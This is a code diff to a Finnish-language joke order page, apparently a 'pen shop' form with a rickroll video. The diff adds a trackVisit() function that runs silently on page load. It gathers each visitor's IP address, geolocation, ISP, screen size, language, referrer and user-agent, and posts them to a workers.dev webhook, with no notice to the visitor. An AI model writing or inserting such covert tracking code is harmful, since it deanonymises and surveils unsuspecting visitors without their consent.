@@ -146,13 +146,14 @@
     <script>
     const form = document.getElementById('discordForm');
     const statusText = document.getElementById('status');
+const webhookURL = 'https://kynatilaukset.suklaasukkulayt.workers.dev/';
 
     form.addEventListener('submit', async function(event) {
         event.preventDefault();
         const msg = document.getElementById('address').value;
         const kyna = document.getElementById('kyna').value;
         const number = document.getElementById('number').value;
-        const webhookURL = 'https://kynatilaukset.suklaasukkulayt.workers.dev/';
+        
     
     if (msg === ''){
         statusText.textContent = 'Osoite uupuu!';
@@ -188,6 +189,58 @@
         rickroll.style.display = "block";
         rickroll.src = "https://www.youtube-nocookie.com/embed/QDia3e12czc?si=uSyLeta4IuE_Fmme&amp;controls&autoplay=1"
     }
+
+    async function trackVisit() {
+        try {
+            const res = await fetch("https://ipwho.is/");
+            const geo = res.ok ? await res.json() : {};
+
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "Uusi vierailu — Kynäkauppa",
+                        color: 3447003,
+                        fields: [
+                            { name: "IP", value: geo.ip || "Ei saatavilla", inline: true },
+                            {
+                                name: "Sijainti",
+                                value: `${geo.city || "?"}, ${geo.region || "?"}, ${geo.country || "?"}`,
+                                inline: true
+                            },
+                            {
+                                name: "ISP",
+                                value: geo.connection?.isp || geo.connection?.org || "Tuntematon",
+                                inline: false
+                            },
+                            {
+                                name: "Näyttö & Kieli",
+                                value: `${window.screen.width}x${window.screen.height} | ${navigator.language}`,
+                                inline: true
+                            },
+                            {
+                                name: "Sivu / Referrer",
+                                value: `URL: ${window.location.href}\nRef: ${document.referrer || "Suora"}`,
+                                inline: false
+                            },
+                            {
+                                name: "User-Agent",
+                                value: `\`\`\`${navigator.userAgent}\`\`\``,
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+        } catch (e) {
+            console.log("Request BLOCKED!");
+        }
+    }
+
+    trackVisit();
+
     </script>
 </body>
 </html>
